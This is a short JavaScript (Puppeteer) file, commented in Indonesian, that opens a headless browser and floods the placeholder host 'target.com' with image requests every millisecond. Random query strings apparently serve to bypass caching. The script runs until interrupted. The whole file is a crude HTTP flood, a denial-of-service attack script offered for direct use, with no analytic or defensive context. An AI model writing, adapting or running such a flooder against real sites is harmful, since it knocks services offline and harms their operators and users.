const puppeteer = require("puppeteer");

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Fungsi untuk dijalankan di dalam browser
  await page.evaluate(() => {
    const tes = () => {
      const url = "target.com";
      const pic = new Image();
      const rand = Math.floor(Math.random() * 10000);
      pic.src = `https://${url}?${rand}=val`;
    };
    setInterval(tes, 1);
  });

  // Tunggu secara manual hingga pengguna menghentikan proses (CTRL+C)
  return new Promise((resolve) => {
    process.on("SIGINT", async () => {
      console.log("SIGINT signal received: closing browser");
      await browser.close();
      resolve();
    });
  });
})();
